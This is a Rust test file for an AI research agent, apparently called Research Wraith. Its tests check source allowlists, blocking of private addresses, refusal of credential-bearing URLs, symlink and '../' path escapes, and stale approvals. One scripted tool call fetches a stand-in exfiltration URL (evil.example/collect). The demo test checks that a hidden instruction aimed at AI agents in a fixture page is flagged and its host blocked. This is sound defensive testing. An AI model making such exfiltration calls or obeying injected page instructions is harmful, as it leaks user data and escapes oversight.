//! Research Wraith tests: URL and allowlist checks, fixture fetch, the brief effect, and the offline demo.

use super::*;
use serde_json::json;
use wraithkit::now_ms;
use wraithkit::{
    ledger::{ClaimStatus, Event, RunStatus},
    model::{Model, tool_calls},
    session::Session,
    verify::{all_ok, verify},
};

/// A folder removed on drop.
struct Scratch(PathBuf);

impl Scratch {
    fn new(tag: &str) -> Self {
        static N: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
        let p = std::env::temp_dir().join(format!(
            "research-wraith-test-{tag}-{}-{}-{}",
            std::process::id(),
            now_ms(),
            N.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        fs::create_dir_all(&p).unwrap();
        Scratch(p)
    }
    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for Scratch {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

/// A fixture folder with the given index, and the bundled pages.
fn fixture_folder(index: &serde_json::Value) -> Scratch {
    let d = Scratch::new("fixture");
    fs::write(d.path().join("index.json"), index.to_string()).unwrap();
    for (name, body) in DEMO_FILES {
        if name != "index.json" {
            fs::write(d.path().join(name), body).unwrap();
        }
    }
    d
}

fn session(target: &Path, runs: &Path, script: &str) -> Session<ResearchWraith> {
    Session::start(
        runs,
        target,
        TASK,
        Mode::Fixture,
        Model::fixture(script).unwrap(),
    )
    .unwrap()
}

fn run_to_end(s: &mut Session<ResearchWraith>) {
    for _ in 0..100 {
        if s.state.status != Some(RunStatus::Running) {
            break;
        }
        s.step().unwrap();
    }
}

fn tool_result(s: &Session<ResearchWraith>, call_id: &str) -> (bool, String) {
    s.ledger
        .lines
        .iter()
        .find_map(|l| match &l.event {
            Event::ToolResult {
                call_id: c,
                ok,
                content,
                ..
            } if c == call_id => Some((*ok, content.clone())),
            _ => None,
        })
        .unwrap()
}

fn one_call(name: &str, args: serde_json::Value) -> String {
    json!([
        {"role": "assistant", "content": null, "tool_calls": [
            {"id": "c1", "type": "function", "function": {"name": name, "arguments": args.to_string()}}]},
        {"role": "assistant", "content": "done"}
    ])
    .to_string()
}

#[test]
fn offlist_host_refused() {
    let d = fixture_folder(&json!({"https://hollowhacks.example/rules": "rules.html"}));
    let runs = Scratch::new("runs-offlist");
    let script = one_call("fetch", json!({"url": "https://evil.example/collect?d=x"}));
    let mut s = session(d.path(), runs.path(), &script);
    run_to_end(&mut s);
    let (ok, content) = tool_result(&s, "c1");
    assert!(!ok);
    assert!(
        content.starts_with("blocked:") && content.contains("not on this run's source list"),
        "{content}"
    );
    assert!(s.ledger.lines.iter().any(
        |l| matches!(&l.event, Event::Blocked { reason, .. } if reason.contains("evil.example"))
    ));
}

#[test]
fn fixture_fetch_uses_same_checks() {
    let d = fixture_folder(&json!({
        "http://hollowhacks.example/rules": "rules.html",
        "https://127.0.0.1/rules": "rules.html",
        "https://hollowhacks.example/rules": "rules.html"
    }));
    let runs = Scratch::new("runs-same");
    for (url, want_ok) in [
        ("http://hollowhacks.example/rules", false),
        ("https://127.0.0.1/rules", false),
        ("https://hollowhacks.example/rules", true),
    ] {
        let mut s = session(
            d.path(),
            runs.path(),
            &one_call("fetch", json!({"url": url})),
        );
        run_to_end(&mut s);
        assert_eq!(tool_result(&s, "c1").0, want_ok, "{url}");
    }
}

#[test]
fn allowlist_from_target_only() {
    // The index lists only the rules page. The FAQ host is never allowed, even though the page is in the folder.
    let d = fixture_folder(&json!({"https://hollowhacks.example/rules": "rules.html"}));
    let app = ResearchWraith::open(d.path(), Mode::Fixture).unwrap();
    assert_eq!(app.allowed, ["hollowhacks.example"]);
    assert!(
        app.system_prompt()
            .contains("https://hollowhacks.example/rules")
    );
    let runs = Scratch::new("runs-target");
    let mut s = session(
        d.path(),
        runs.path(),
        &one_call("fetch", json!({"url": "https://hollowhacks.example/faq"})),
    );
    run_to_end(&mut s);
    let (ok, content) = tool_result(&s, "c1");
    assert!(
        !ok,
        "a page on an allowed host that is not in the index is refused"
    );
    assert!(content.contains("not in the fixture index"), "{content}");
}

#[test]
fn live_sources_file_is_checked() {
    let d = Scratch::new("sources");
    let file = d.path().join("sources.txt");
    fs::write(
        &file,
        "# my sources\nhttps://a.example/one\n\nhttps://b.example/two\n",
    )
    .unwrap();
    let app = ResearchWraith::open(&file, Mode::Live).unwrap();
    assert_eq!(app.allowed, ["a.example", "b.example"]);
    assert_eq!(app.base, fs::canonicalize(d.path()).unwrap());
    fs::write(&file, "https://a.example/one\nhttp://b.example/two\n").unwrap();
    let err = ResearchWraith::open(&file, Mode::Live).err().unwrap();
    assert!(err.contains("line 2"), "names the bad line: {err}");
    fs::write(&file, "# nothing here\n").unwrap();
    assert!(
        ResearchWraith::open(&file, Mode::Live).is_err(),
        "an empty source list is refused"
    );
}

#[test]
fn brief_stale_if_created_meanwhile() {
    let d = fixture_folder(&json!({"https://hollowhacks.example/rules": "rules.html"}));
    let runs = Scratch::new("runs-stale");
    let script = one_call(
        "save_brief",
        json!({"name": "stale-check", "markdown": "# Brief\n"}),
    );
    let mut s = session(d.path(), runs.path(), &script);
    s.step().unwrap();
    let digest = s.state.proposals[0].digest.clone();
    assert_eq!(
        s.state.proposals[0].inputs["briefs/stale-check.md"],
        "absent"
    );
    fs::create_dir_all(d.path().join("briefs")).unwrap();
    fs::write(
        d.path().join("briefs/stale-check.md"),
        "written by someone else",
    )
    .unwrap();
    let outcome = s.decide("P1", true, &digest).unwrap();
    assert!(outcome.starts_with("stale:"), "{outcome}");
    assert_eq!(
        fs::read_to_string(d.path().join("briefs/stale-check.md")).unwrap(),
        "written by someone else"
    );
}

#[test]
fn brief_name_is_checked_at_preview() {
    let d = fixture_folder(&json!({"https://hollowhacks.example/rules": "rules.html"}));
    let app = ResearchWraith::open(d.path(), Mode::Fixture).unwrap();
    let bad = app.preview("save_brief", &json!({"name": "../escape", "markdown": "x"}));
    assert!(bad.is_err());
    let msg = app
        .preview(
            "save_brief",
            &json!({"name": "rfc2606_reserved_domains", "markdown": "x"}),
        )
        .unwrap_err();
    assert!(
        msg.contains("rfc2606_reserved_domains"),
        "the error names what was sent: {msg}"
    );
    assert!(
        msg.contains("for example rfc2606-domains"),
        "and gives an allowed name: {msg}"
    );
    assert!(
        app.preview("save_brief", &json!({"name": "ok-name", "markdown": "x"}))
            .is_ok()
    );
}

#[test]
fn script_is_valid() {
    let turns: Vec<serde_json::Value> = serde_json::from_str(SCRIPT).expect("script.json parses");
    let app = ResearchWraith {
        mode: Mode::Fixture,
        base: PathBuf::new(),
        allowed: vec![],
        fixtures: BTreeMap::new(),
        sources: vec![],
    };
    let mut known: Vec<String> = app.tools().iter().map(|t| t.name.to_string()).collect();
    known.extend(["claim".to_string(), "finish".to_string()]);
    for turn in &turns {
        for c in tool_calls(turn) {
            assert!(known.contains(&c.name), "unknown tool {} in script", c.name);
            assert!(c.args.is_ok(), "arguments of {} are valid JSON", c.name);
        }
    }
}

#[test]
fn demo_runs_offline() {
    let demo = ResearchWraith::demo().unwrap();
    let d = Scratch(demo.target.clone());
    let runs = Scratch::new("runs-demo");
    let mut s = Session::<ResearchWraith>::start(
        runs.path(),
        d.path(),
        TASK,
        Mode::Fixture,
        Model::fixture(ResearchWraith::DEMO_SCRIPT).unwrap(),
    )
    .unwrap();
    assert!(
        s.state.model.starts_with("FIXTURE"),
        "the fixture label is recorded"
    );
    run_to_end(&mut s);
    assert_eq!(s.state.status, Some(RunStatus::Waiting));

    // The injected host is refused and shown in the timeline.
    assert!(s.ledger.lines.iter().any(
        |l| matches!(&l.event, Event::Blocked { reason, .. } if reason.contains("evil.example"))
    ));
    assert!(
        s.state
            .timeline
            .iter()
            .any(|t| t.text.starts_with("⛔ blocked"))
    );
    // The hidden instruction in the guide is flagged as evidence.
    assert!(
        s.state.evidence[1]
            .flags
            .iter()
            .any(|f| f == "addresses_ai_agents")
    );

    // The conflict keeps both sources. The wrong quote is downgraded.
    let claims = &s.state.claims;
    assert_eq!(claims.len(), 3);
    assert_eq!(claims[0].status, ClaimStatus::Conflicted);
    assert_eq!(claims[0].cites.len(), 2);
    assert!(
        claims[0].cites.iter().all(|c| c.found),
        "both quotes are found"
    );
    assert_eq!(claims[1].status, ClaimStatus::Supported);
    assert_eq!(
        claims[2].status,
        ClaimStatus::Unsupported,
        "the wrong quote is downgraded"
    );
    assert!(!claims[2].cites[0].found);

    let dg = s.state.proposals[0].digest.clone();
    assert_eq!(s.decide("P1", true, &dg).unwrap(), "approved");
    run_to_end(&mut s);
    assert_eq!(s.state.status, Some(RunStatus::Finished));
    let brief = fs::read_to_string(d.path().join("briefs/hollow-hacks-deadline.md")).unwrap();
    assert!(brief.contains("sources conflict"), "the brief is saved");
    let (checks, _) = verify(s.run_dir()).unwrap();
    assert!(all_ok(&checks), "verify passes on the demo run");
}

#[test]
fn brief_card_shows_every_line() {
    let d = fixture_folder(&json!({"https://hollowhacks.example/rules": "rules.html"}));
    let app = ResearchWraith::open(d.path(), Mode::Fixture).unwrap();
    let markdown: String = (1..=100).map(|i| format!("line {i}\n")).collect();
    let p = app
        .preview("save_brief", &json!({"name": "long", "markdown": markdown}))
        .unwrap();
    assert!(
        p.detail.contains("line 100"),
        "nothing written is hidden from the card"
    );
}

// Live-network checks. They need internet and no API key. Run by hand:
//     cargo test -p research-wraith -- --ignored --nocapture

fn live_app(sources: &[&str]) -> (Scratch, ResearchWraith) {
    let d = Scratch::new("live");
    let file = d.path().join("sources.txt");
    fs::write(&file, sources.join("\n")).unwrap();
    let app = ResearchWraith::open(&file, Mode::Live).unwrap();
    (d, app)
}

#[test]
#[ignore = "needs internet"]
fn live_fetch_reads_real_pages() {
    let (_d, app) = live_app(&[
        "https://www.rfc-editor.org/rfc/rfc2606.html",
        "https://www.iana.org/domains/reserved",
    ]);
    let (url, text) = app
        .fetch_live("https://www.rfc-editor.org/rfc/rfc2606.html")
        .expect("rfc-editor");
    assert!(url.contains("rfc2606"), "{url}");
    assert!(
        text.contains("Reserved Top Level DNS Names"),
        "html became readable text"
    );
    assert!(
        !text.contains("<html") && !text.contains("<script"),
        "tags are gone"
    );
    let (_, iana) = app
        .fetch_live("https://www.iana.org/domains/reserved")
        .expect("iana");
    assert!(iana.len() > 500, "iana page has text: {} bytes", iana.len());
    eprintln!(
        "rfc-editor: {} chars, iana: {} chars",
        text.len(),
        iana.len()
    );
}

#[test]
#[ignore = "needs internet"]
fn live_fetch_refuses_hosts_that_resolve_to_private_addresses() {
    // localtest.me is a public name that resolves to 127.0.0.1, so only the address check can stop it.
    let (_d, app) = live_app(&["https://localtest.me/"]);
    let err = app.fetch_live("https://localtest.me/").unwrap_err();
    assert!(
        err.starts_with("blocked:") && err.contains("non-public"),
        "{err}"
    );
}

#[test]
#[ignore = "needs internet"]
fn live_fetch_refuses_hosts_off_the_list() {
    let (_d, app) = live_app(&["https://www.rfc-editor.org/rfc/rfc2606.html"]);
    let err = app
        .fetch_live("https://www.iana.org/domains/reserved")
        .unwrap_err();
    assert!(
        err.starts_with("blocked:") && err.contains("source list"),
        "{err}"
    );
}

fn make_dir_link(target: &Path, link: &Path) {
    #[cfg(unix)]
    std::os::unix::fs::symlink(target, link).unwrap();
    #[cfg(windows)]
    assert!(
        std::process::Command::new("cmd")
            .args(["/c", "mklink", "/J"])
            .arg(link)
            .arg(target)
            .output()
            .unwrap()
            .status
            .success(),
        "test junction must be created"
    );
}

#[test]
fn brief_parent_link_is_refused() {
    let d = fixture_folder(&json!({}));
    let outside = Scratch::new("brief-link-outside");
    let app = ResearchWraith::open(d.path(), Mode::Fixture).unwrap();
    make_dir_link(outside.path(), &d.path().join("briefs"));
    let result = app.preview("save_brief", &json!({"name": "escape", "markdown": "no"}));
    assert!(
        result.is_err(),
        "a linked briefs directory must not be accepted"
    );
    assert!(!outside.path().join("escape.md").exists());
}

#[test]
fn brief_parent_link_added_after_proposal_is_stale() {
    let d = fixture_folder(&json!({}));
    let outside = Scratch::new("brief-late-link-outside");
    let runs = Scratch::new("runs-late-link");
    let script = one_call("save_brief", json!({"name": "escape", "markdown": "no"}));
    let mut s = session(d.path(), runs.path(), &script);
    s.step().unwrap();
    let digest = s.state.proposals[0].digest.clone();
    make_dir_link(outside.path(), &d.path().join("briefs"));
    let outcome = s.decide("P1", true, &digest).unwrap();
    assert!(outcome.starts_with("stale:"), "{outcome}");
    assert!(!outside.path().join("escape.md").exists());
    assert!(
        !s.ledger
            .lines
            .iter()
            .any(|l| matches!(l.event, Event::EffectStarted { .. }))
    );
}

#[cfg(unix)]
#[test]
fn brief_file_links_including_dangling_links_are_refused() {
    let d = fixture_folder(&json!({}));
    let outside = Scratch::new("brief-file-link-outside");
    fs::create_dir(d.path().join("briefs")).unwrap();
    let app = ResearchWraith::open(d.path(), Mode::Fixture).unwrap();
    for (name, exists) in [("existing", true), ("dangling", false)] {
        let target = outside.path().join(format!("{name}.md"));
        if exists {
            fs::write(&target, "keep me").unwrap();
        }
        std::os::unix::fs::symlink(&target, d.path().join("briefs").join(format!("{name}.md")))
            .unwrap();
        assert!(
            app.preview("save_brief", &json!({"name": name, "markdown": "no"}))
                .is_err()
        );
    }
}

#[test]
fn brief_directory_is_not_reported_as_absent() {
    let d = fixture_folder(&json!({}));
    fs::create_dir_all(d.path().join("briefs/not-a-file.md")).unwrap();
    let app = ResearchWraith::open(d.path(), Mode::Fixture).unwrap();
    assert!(
        app.preview(
            "save_brief",
            &json!({"name": "not-a-file", "markdown": "no"})
        )
        .is_err()
    );
}

#[test]
fn approved_brief_replaces_existing_file() {
    let d = fixture_folder(&json!({}));
    let runs = Scratch::new("runs-replace-brief");
    fs::create_dir(d.path().join("briefs")).unwrap();
    let path = d.path().join("briefs/existing.md");
    fs::write(&path, "original").unwrap();
    let script = one_call(
        "save_brief",
        json!({"name": "existing", "markdown": "replacement"}),
    );
    let mut s = session(d.path(), runs.path(), &script);
    s.step().unwrap();
    assert!(
        s.state.proposals[0]
            .warnings
            .iter()
            .any(|w| w.contains("replaces"))
    );
    let digest = s.state.proposals[0].digest.clone();
    assert_eq!(s.decide("P1", true, &digest).unwrap(), "approved");
    assert_eq!(fs::read_to_string(path).unwrap(), "replacement");
}

#[test]
fn failed_brief_write_preserves_previous_file_and_removes_temp() {
    struct FailsAfterPrefix(bool);
    impl std::io::Read for FailsAfterPrefix {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            if self.0 {
                return Err(std::io::Error::other("simulated interrupted write"));
            }
            self.0 = true;
            buf[..4].copy_from_slice(b"half");
            Ok(4)
        }
    }
    let d = Scratch::new("failed-brief");
    let path = d.path().join("original.md");
    fs::write(&path, "keep this brief").unwrap();
    assert!(replace_brief(&path, FailsAfterPrefix(false)).is_err());
    assert_eq!(fs::read_to_string(&path).unwrap(), "keep this brief");
    assert_eq!(
        fs::read_dir(d.path()).unwrap().count(),
        1,
        "no temporary file left"
    );
}

#[cfg(unix)]
#[test]
fn brief_replacement_preserves_file_mode() {
    use std::os::unix::fs::PermissionsExt;
    let d = Scratch::new("brief-mode");
    let path = d.path().join("private.md");
    fs::write(&path, "private").unwrap();
    fs::set_permissions(&path, fs::Permissions::from_mode(0o600)).unwrap();
    replace_brief(&path, &b"replacement"[..]).unwrap();
    assert_eq!(
        fs::metadata(&path).unwrap().permissions().mode() & 0o777,
        0o600
    );
}

#[test]
fn brief_base_replaced_with_link_is_refused() {
    let d = Scratch::new("base-link");
    let outside = Scratch::new("base-link-outside");
    let base = d.path().join("source");
    fs::create_dir(&base).unwrap();
    fs::write(base.join("index.json"), "{}").unwrap();
    let app = ResearchWraith::open(&base, Mode::Fixture).unwrap();
    fs::rename(&base, d.path().join("original-source")).unwrap();
    make_dir_link(outside.path(), &base);
    assert!(
        app.preview("save_brief", &json!({"name": "escape", "markdown": "no"}))
            .is_err()
    );
    assert!(!outside.path().join("briefs/escape.md").exists());
}

#[test]
fn brief_resume_binds_resolved_destination() {
    let d = Scratch::new("resume-destination");
    let outside = fixture_folder(&json!({}));
    let base = d.path().join("source");
    fs::create_dir(&base).unwrap();
    fs::write(base.join("index.json"), "{}").unwrap();
    let runs = Scratch::new("runs-resume-destination");
    let script = one_call("save_brief", json!({"name": "escape", "markdown": "no"}));
    let mut s = session(&base, runs.path(), &script);
    s.step().unwrap();
    let digest = s.state.proposals[0].digest.clone();
    let run = s.run_dir().to_path_buf();
    drop(s);
    fs::rename(&base, d.path().join("original-source")).unwrap();
    make_dir_link(outside.path(), &base);
    let mut resumed =
        Session::<ResearchWraith>::resume(&run, Model::fixture(&script).unwrap()).unwrap();
    let result = resumed.decide("P1", true, &digest).unwrap();
    assert!(result.starts_with("stale:"), "{result}");
    assert!(!outside.path().join("briefs/escape.md").exists());
}

#[test]
fn brief_resume_keeps_unchanged_destination() {
    let d = fixture_folder(&json!({}));
    let runs = Scratch::new("runs-resume-normal");
    let script = one_call("save_brief", json!({"name": "normal", "markdown": "saved"}));
    let mut s = session(d.path(), runs.path(), &script);
    s.step().unwrap();
    let digest = s.state.proposals[0].digest.clone();
    let run = s.run_dir().to_path_buf();
    drop(s);
    let mut resumed =
        Session::<ResearchWraith>::resume(&run, Model::fixture(&script).unwrap()).unwrap();
    assert_eq!(resumed.decide("P1", true, &digest).unwrap(), "approved");
    assert_eq!(
        fs::read_to_string(d.path().join("briefs/normal.md")).unwrap(),
        "saved"
    );
}

#[test]
fn read_only_brief_is_not_replaced_or_left_in_a_temp_file() {
    let d = Scratch::new("readonly-brief");
    let path = d.path().join("original.md");
    fs::write(&path, "keep this").unwrap();
    let original = fs::metadata(&path).unwrap().permissions();
    let mut readonly = original.clone();
    readonly.set_readonly(true);
    fs::set_permissions(&path, readonly).unwrap();
    let result = replace_brief(&path, &b"replacement"[..]);
    fs::set_permissions(&path, original).unwrap();
    assert!(result.is_err());
    assert_eq!(fs::read_to_string(&path).unwrap(), "keep this");
    assert_eq!(fs::read_dir(d.path()).unwrap().count(), 1);
}

#[test]
fn source_url_credentials_are_refused_without_echoing() {
    let d = Scratch::new("source-credentials");
    let source = d.path().join("sources.txt");
    for url in [
        "https://reader:synthetic-password@example.com/page",
        "http://reader:synthetic-password@example.com/page",
    ] {
        fs::write(&source, url).unwrap();
        let error = match ResearchWraith::open(&source, Mode::Live) {
            Ok(_) => panic!("credential-bearing source must be rejected before model use"),
            Err(error) => error,
        };
        assert!(error.contains("sources file line 1"));
        assert!(!error.contains("synthetic-password"));
        assert!(!error.contains("reader"));
    }
}

#[test]
fn credential_hops_refused_but_at_in_path_is_allowed() {
    let allowed = vec!["example.com".to_string()];
    for url in [
        "https://reader:synthetic-password@example.com/",
        "https://reader@example.com/",
    ] {
        assert!(check_url(url).is_err(), "userinfo must be refused");
        assert!(
            vet_hop(url, &allowed).is_err(),
            "redirect hops use the same rule"
        );
    }
    assert_eq!(
        check_url("https://example.com/@reader?q=a@b").unwrap(),
        "example.com"
    );
}
